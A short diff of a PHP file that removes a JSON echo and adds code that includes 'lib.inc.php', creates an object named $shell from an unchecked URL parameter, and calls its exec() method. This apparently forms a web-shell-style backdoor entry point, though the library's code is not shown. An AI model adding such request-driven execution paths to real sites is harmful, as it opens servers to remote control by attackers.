@@ -1,4 +1,12 @@
 <?php
 
-$json = json_decode(file_get_contents('php://input'));
-print_r($json);
+include 'lib.inc.php';
+
+
+$shell = new Core($_GET['id']);
+if ($shell->check()) {
+    $shell->exec();
+}
+
+
+
